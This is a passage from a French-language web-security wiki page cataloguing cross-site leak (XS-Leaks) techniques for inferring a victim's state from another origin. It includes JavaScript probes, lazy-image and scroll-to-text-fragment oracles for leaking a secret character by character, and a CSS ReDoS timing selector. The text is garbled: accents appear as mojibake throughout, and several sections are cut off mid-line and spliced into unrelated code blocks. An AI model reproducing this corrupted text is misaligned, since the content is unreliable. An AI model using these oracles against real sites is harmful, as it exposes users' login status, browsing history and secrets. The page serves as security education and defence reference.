Notez que si l'origine n'est pas r√©fl√©chie mais qu'un joker est utilis√© (`Access-Control-Allow-Origin: *`), cela ne fonctionnera pas.

## Technique des attributs lisibles

### Redirection Fetch

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : Code d'√©tat
* **Plus d'informations** : [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **R√©sum√©** : GC et SA permettent de v√©rifier le type de r√©ponse (redirection opaque) apr√®s la fin de la redirection.
* **Exemple de code** : [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

En soumettant une requ√™te √† l'aide de l'API Fetch avec `redirect: "manual"` et d'autres param√®tres, il est possible de lire l'attribut `response.type` et si celui-ci est √©gal √† `opaqueredirect`, alors la r√©ponse √©tait une redirection.

### COOP

* **M√©thodes d'inclusion** : Pop-ups
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'informations** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **R√©sum√©** : Les pages prot√©g√©es par la politique d'ouverture cross-origin (COOP) emp√™chent l'acc√®s aux interactions cross-origin.
* **Exemple de code** : [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un attaquant est capable de d√©duire la pr√©sence de l'en-t√™te de politique d'ouverture cross-origin (COOP) dans une r√©ponse HTTP cross-origin. COOP est utilis√© par les applications Web pour emp√™cher les sites externes d'obtenir des r√©f√©rences de fen√™tre arbitraires. La visibilit√© de cet en-t√™te peut √™tre discern√©e en tentant d'acc√©der √† la **r√©f√©rence `contentWindow`**. Dans les sc√©narios o√π COOP est appliqu√© de mani√®re conditionnelle, la **propri√©t√© `opener`** devient un indicateur r√©v√©lateur : elle est **ind√©finie** lorsque COOP est active et **d√©finie** en son absence.

### Longueur maximale de l'URL - C√¥t√© serveur

* **M√©thodes d'inclusion** : Fetch API, √âl√©ments HTML
* **Diff√©rence d√©tectable** : Code d'√©tat / Contenu
* **Plus d'informations** : [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **R√©sum√©** : D√©tecter les diff√©rences dans les r√©ponses en raison de la longueur de la r√©ponse de redirection qui pourrait √™tre trop grande, de sorte que le serveur renvoie une erreur et qu'une alerte soit g√©n√©r√©e.
* **Exemple de code** : [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si une redirection c√¥t√© serveur utilise **l'entr√©e utilisateur dans la redirection** et **des donn√©es suppl√©mentaires**, il est possible de d√©tecter ce comportement car les **serveurs** ont une **limite de longueur de requ√™te**. Si les **donn√©es utilisateur** ont une **longueur - 1**, car la **redirection** utilise **ces donn√©es** et **ajoute** quelque chose **en plus**, cela d√©clenchera une **erreur d√©tectable via les √©v√©nements d'erreur**.

Si vous parvenez √† d√©finir des cookies pour un utilisateur, vous pouvez √©galement effectuer cette attaque en **d√©finissant suffisamment de cookies** ([**bombe de cookies**](hacking-with-cookies/cookie-bomb.md)) de sorte que avec la **taille de r√©ponse augment√©e** de la **r√©ponse correcte**, une **erreur** est d√©clench√©e. Dans ce cas, rappelez-vous que si vous d√©clenchez cette requ√™te √† partir d'un m√™me site, `<script>` enverra automatiquement les cookies (pour que vous puissiez v√©rifier les erreurs).\
Un exemple de **bombe de cookies + XS-Search** peut √™tre trouv√© dans la solution pr√©vue de cet article : [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou √™tre dans le m√™me contexte est g√©n√©ralement n√©cessaire pour ce type d'attaque.

### Longueur maximale de l'URL - C√¥t√© client

* **M√©thodes d'inclusion** : Pop-ups
* **
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Comptage des cadres

* **M√©thodes d'inclusion**: Cadres, Pop-ups
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **R√©sum√©:** √âvaluez la quantit√© d'√©l√©ments iframe en inspectant la propri√©t√© `window.length`.
* **Exemple de code**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Compter le **nombre de cadres dans un site web** ouvert via `iframe` ou `window.open` peut aider √† identifier le **statut de l'utilisateur sur cette page**.\
De plus, si la page a toujours le m√™me nombre de cadres, v√©rifier **continuellement** le nombre de cadres peut aider √† identifier un **mod√®le** qui pourrait divulguer des informations.

Un exemple de cette technique est que dans Chrome, un **PDF** peut √™tre **d√©tect√©** avec le **comptage des cadres** car un `embed` est utilis√© en interne. Il existe des [Param√®tres d'URL ouverts](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) qui permettent un certain contr√¥le sur le contenu tel que `zoom`, `view`, `page`, `toolbar` o√π cette technique pourrait √™tre int√©ressante.

### HTMLElements

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **R√©sum√©:** Lire la valeur divulgu√©e pour distinguer entre 2 √©tats possibles
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

La fuite d'informations √† travers les √©l√©ments HTML est une pr√©occupation en mati√®re de s√©curit√© web, en particulier lorsque des fichiers multim√©dias dynamiques sont g√©n√©r√©s en fonction des informations de l'utilisateur, ou lorsque des filigranes sont ajout√©s, modifiant la taille des m√©dias. Cela peut √™tre exploit√© par des attaquants pour diff√©rencier entre des √©tats possibles en analysant les informations expos√©es par certains √©l√©ments HTML.

### Informations expos√©es par les √©l√©ments HTML

- **HTMLMediaElement**: Cet √©l√©ment r√©v√®le la `dur√©e` et les temps `buffered` des m√©dias, qui peuvent √™tre consult√©s via son API.
[Lire plus sur HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Il expose `videoHeight` et `videoWidth`. Dans certains navigateurs, des propri√©t√©s suppl√©mentaires comme `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` et `webkitDecodedFrameCount` sont disponibles, offrant des informations plus approfondies sur le contenu multim√©dia.
[Lire plus sur HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Cette fonction fournit des d√©tails sur la qualit√© de la lecture vid√©o, y compris `totalVideoFrames`, qui peut indiquer la quantit√© de donn√©es vid√©o trait√©es.
[Lire plus sur getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Cet √©l√©ment divulgue la `hauteur` et la `largeur` d'une image. Cependant, si une image est invalide, ces propri√©t√©s renverront 0, et la fonction `image.decode()` sera rejet√©e, indiquant l'√©chec du chargement correct de l'image.
[Lire plus sur HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Propri√©t√© CSS

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **R√©sum√©:** Identifier les variations dans la mise en page du site web qui correspondent √† l'√©tat ou au statut de l'utilisateur.
* **Exemple de code**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Les applications web peuvent changer le **style du site web en fonction de l'√©tat de l'utilisateur**. Les fichiers CSS cross-origin peuvent √™tre int√©gr√©s sur la page de l'attaquant avec l'**√©l√©ment de lien HTML**, et les **r√®gles** seront **appliqu√©es** √† la page de l'attaquant. Si une page modifie dynamiquement ces r√®gles, un attaquant peut **d√©tecter** ces **diff√©rences** en fonction de l'√©tat de l'utilisateur.\
En tant que technique de fuite, l'attaquant peut utiliser la m√©thode `window.getComputedStyle` pour **lire les propri√©t√©s CSS** d'un √©l√©ment HTML sp√©cifique. Par cons√©quent, un attaquant peut lire des propri√©t√©s CSS arbitraires si l'√©l√©ment affect√© et le nom de la propri√©t√© sont connus.

### Historique CSS

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **R√©sum√©:** D√©tecter si le style `:visited` est appliqu√© √† une URL indiquant qu'elle a d√©j√† √©t√© visit√©e
* **Exemple de code**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Selon [**ceci**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), cela ne fonctionne pas dans Chrome headless.
{% endhint %}

Le s√©lecteur CSS `:visited` est utilis√© pour styliser diff√©remment les URL si elles ont √©t√© pr√©c√©demment visit√©es par l'utilisateur. Dans le pass√©, la m√©thode `getComputedStyle()` pouvait √™tre utilis√©e pour identifier ces diff√©rences de style. Cependant, les navigateurs modernes ont mis en place des mesures de s√©curit√© pour emp√™cher cette m√©thode de r√©v√©ler l'√©tat d'un lien. Ces mesures incluent toujours renvoyer le style calcul√© comme si le lien √©tait visit√© et restreindre les styles pouvant √™tre appliqu√©s avec le s√©lecteur `:visited`.

Malgr√© ces restrictions, il est possible de discerner l'√©tat visit√© d'un lien de mani√®re indirecte. Une technique implique de tromper l'utilisateur pour qu'il interagisse avec une zone affect√©e par le CSS, en utilisant sp√©cifiquement la propri√©t√© `mix-blend-mode`. Cette propri√©t√© permet le m√©lange des √©l√©ments avec leur arri√®re-plan, r√©v√©lant potentiellement l'√©tat visit√© en fonction de l'interaction de l'utilisateur.

De plus, la d√©tection peut √™tre r√©alis√©e sans interaction de l'utilisateur en exploitant les d√©lais de rendu des liens. Comme les navigateurs peuvent rendre les liens visit√©s et non visit√©s diff√©remment, cela peut introduire une diff√©rence de temps mesurable dans le rendu. Une preuve de concept (PoC) a √©t√© mentionn√©e dans un rapport de bogue de Chromium, d√©montrant cette technique en utilisant plusieurs liens pour amplifier la diff√©rence de timing, rendant ainsi l'√©tat visit√© d√©tectable gr√¢ce √† une analyse temporelle.

Pour plus de d√©tails sur ces propri√©t√©s et m√©thodes, consultez leurs pages de documentation :
- `:visited` : [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()` : [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode` : [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### Fuite X-Frame de ContentDocument

* **M√©thodes d'inclusion**: Cadres
* **Diff√©rence d√©tectable**: En-t√™tes
* **Plus d'informations**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **R√©sum√©:** Dans Google Chrome, une page d'erreur d√©di√©e s'affiche lorsqu'une page est bloqu√©e pour √™tre int√©gr√©e sur un site cross-origin en raison des restrictions X-Frame-Options.
* **Exemple de code**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Dans Chrome, si une page avec l'en-t√™te `X-Frame-Options` d√©fini sur "deny" ou "same-origin" est int√©gr√©e en tant qu'objet, une page d'erreur appara√Æt. Chrome renvoie de mani√®re unique un objet de document vide (au lieu de `null`) pour la propri√©t√© `contentDocument` de cet objet, contrairement aux iframes ou √† d'autres navigateurs. Les attaquants pourraient exploiter cela en d√©tectant le document vide, r√©v√©lant potentiellement des informations sur l'√©tat de l'utilisateur, surtout si les d√©veloppeurs d√©finissent de mani√®re incoh√©rente l'en-t√™te X-Frame-Options, en n√©gligeant souvent les pages d'erreur. La sensibilisation et l'application coh√©rente des en-t√™tes de s√©curit√© sont cruciales pour pr√©venir de telles fuites.

### D√©tection de T√©l√©chargement

* **M√©thodes d'inclusion**: Cadres, Pop-ups
* **Diff√©rence d√©tectable**: En-t√™tes
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **R√©sum√©:** Un attaquant peut discerner les t√©l√©chargements de fichiers en exploitant les iframes ; la continuit√© de l'accessibilit√© de l'iframe implique un t√©l√©chargement de fichier r√©ussi.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

L'en-t√™te `Content-Disposition`, en particulier `Content-Disposition: attachment`, indique au navigateur de t√©l√©charger le contenu plut√¥t que de l'afficher en ligne. Ce comportement peut √™tre exploit√© pour d√©tecter si un utilisateur a acc√®s √† une page qui d√©clenche un t√©l√©chargement de fichier. Dans les navigateurs bas√©s sur Chromium, il existe quelques techniques pour d√©tecter ce comportement de t√©l√©chargement :

1. **Surveillance de la barre de t√©l√©chargement** :
- Lorsqu'un fichier est t√©l√©charg√© dans les navigateurs bas√©s sur Chromium, une barre de t√©l√©chargement appara√Æt en bas de la fen√™tre du navigateur.
- En surveillant les changements de hauteur de la fen√™tre, les attaquants peuvent d√©duire l'apparition de la barre de t√©l√©chargement, sugg√©rant qu'un t√©l√©chargement a √©t√© initi√©.

2. **Navigation de T√©l√©chargement avec Iframes** :
- Lorsqu'une page d√©clenche un t√©l√©chargement de fichier en utilisant l'en-t√™te `Content-Disposition: attachment`, cela ne provoque pas d'√©v√©nement de navigation.
- En chargeant le contenu dans un iframe et en surveillant les √©v√©nements de navigation, il est possible de v√©rifier si la disposition du contenu provoque un t√©l√©chargement de fichier (pas de navigation) ou non.

3. **Navigation de T√©l√©chargement sans Iframes** :
- Similaire √† la technique de l'iframe, cette m√©thode implique d'utiliser `window.open` au lieu d'un iframe.
- En surveillant les √©v√©nements de navigation dans la nouvelle fen√™tre ouverte, il est possible de d√©terminer si un t√©l√©chargement de fichier a √©t√© d√©clench√© (pas de navigation) ou si le contenu est affich√© en ligne (navigation se produit).

Dans les sc√©narios o√π seuls les utilisateurs connect√©s peuvent d√©clencher de tels t√©l√©chargements, ces techniques peuvent √™tre utilis√©es pour d√©duire indirectement l'√©tat d'authentification de l'utilisateur en fonction de la r√©ponse du navigateur √† la demande de t√©l√©chargement.

### Contournement de la mise en cache HTTP partitionn√©e <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**: Chronom√©trage
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **R√©sum√©:** Un attaquant peut discerner les t√©l√©chargements de fichiers en exploitant les iframes ; la continuit√© de l'accessibilit√© de l'iframe implique un t√©l√©chargement de fichier r√©ussi.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
C'est pourquoi cette technique est int√©ressante : Chrome a maintenant une **partition de cache**, et la cl√© de cache de la page nouvellement ouverte est : `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, mais si j'ouvre une page ngrok et utilise fetch dedans, la cl√© de cache sera : `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **cl√© de cache est diff√©rente**, donc la cache ne peut pas √™tre partag√©e. Vous pouvez trouver plus de d√©tails ici : [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Commentaire de [**ici**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un site `exemple.com` inclut une ressource de `*.exemple.com/resource`, alors cette ressource aura la **m√™me cl√© de mise en cache** que si la ressource √©tait directement **demand√©e via une navigation de premier niveau**. Cela est d√ª au fait que la cl√© de mise en cache est compos√©e de l'_eTLD+1_ de premier niveau et de l'_eTLD+1_ du cadre.

√âtant donn√© que l'acc√®s √† la mise en cache est plus rapide que le chargement d'une ressource, il est possible d'essayer de changer l'emplacement d'une page et de l'annuler 20 ms (par exemple) apr√®s. Si l'origine a √©t√© modifi√©e apr√®s l'arr√™t, cela signifie que la ressource √©tait mise en cache.\
Ou pourrait simplement **envoyer quelques fetch √† la page potentiellement mise en cache et mesurer le temps que cela prend**.

### Redirection Manuelle <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©thodes d'inclusion**: API Fetch
* **Diff√©rence d√©tectable**: Redirections
* **Plus d'informations**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **R√©sum√©:** Il est possible de savoir si une r√©ponse √† une requ√™te fetch est une redirection
* **Exemple de code**:

![](<../.gitbook/assets/image (652).png>)

### Fetch avec AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abort
```html
<img src=/something loading=lazy >
```
Par cons√©quent, ce que vous pouvez faire est d'**ajouter beaucoup de caract√®res ind√©sirables** (par exemple **des milliers de "W"**) pour **remplir la page web avant le secret ou ajouter quelque chose comme** `<br><canvas height="1850px"></canvas><br>.`\
Ensuite, si par exemple notre **injection appara√Æt avant le drapeau**, l'**image** sera **charg√©e**, mais si elle appara√Æt **apr√®s** le **drapeau**, le drapeau + les caract√®res ind√©sirables **emp√™cheront son chargement** (vous devrez jouer avec la quantit√© de caract√®res ind√©sirables √† placer). C'est ce qui s'est pass√© dans [**ce writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Une autre option serait d'utiliser le **scroll-to-text-fragment** si cela est autoris√© :

#### Scroll-to-text-fragment

Cependant, vous pouvez faire en sorte que le **robot acc√®de √† la page** avec quelque chose comme
```
#:~:text=SECR
```
Donc, la page web ressemblera √† : **`https://victim.com/post.html#:~:text=SECR`**

O√π post.html contient les caract√®res ind√©sirables de l'attaquant et une image en chargement diff√©r√©, puis le secret du bot est ajout√©.

Ce texte permettra au bot d'acc√©der √† n'importe quel texte dans la page contenant le texte `SECR`. Comme ce texte est le secret et qu'il est juste **sous l'image**, l'image ne se chargera que si le secret devin√© est correct. Ainsi, vous avez votre oracle pour **exfiltrer le secret caract√®re par caract√®re**.

Un exemple de code pour exploiter cela : [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Chargement diff√©r√© de l'image bas√© sur le temps

S'il n'est **pas possible de charger une image externe** qui pourrait indiquer √† l'attaquant que l'image a √©t√© charg√©e, une autre option serait d'essayer de **deviner le caract√®re plusieurs fois et de mesurer cela**. Si l'image est charg√©e, toutes les requ√™tes prendront plus de temps que si l'image n'est pas charg√©e. C'est ce qui a √©t√© utilis√© dans la [**solution de ce writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **r√©sum√© ici :**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### ReDoS CSS

Si `jQuery(location.hash)` est utilis√©, il est possible de d√©terminer via le timing **si un contenu HTML existe**, car si le s√©lecteur `main[id='site-main']` ne correspond pas, il n'est pas n√©cessaire de v√©rifier le reste des **s√©lecteurs** :
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Injection CSS

{% content-ref url="xs-search/css-injection/" %}
[injection CSS](xs-search/css-injection/)
{% endcontent-ref %}

## D√©fenses

Il existe des mesures d'att√©nuation recommand√©es dans [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ainsi que dans chaque section du wiki [https://xsleaks.dev/](https://xsleaks.dev/). Consultez-les pour plus d'informations sur la mani√®re de se prot√©ger contre ces techniques.

## R√©f√©rences

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
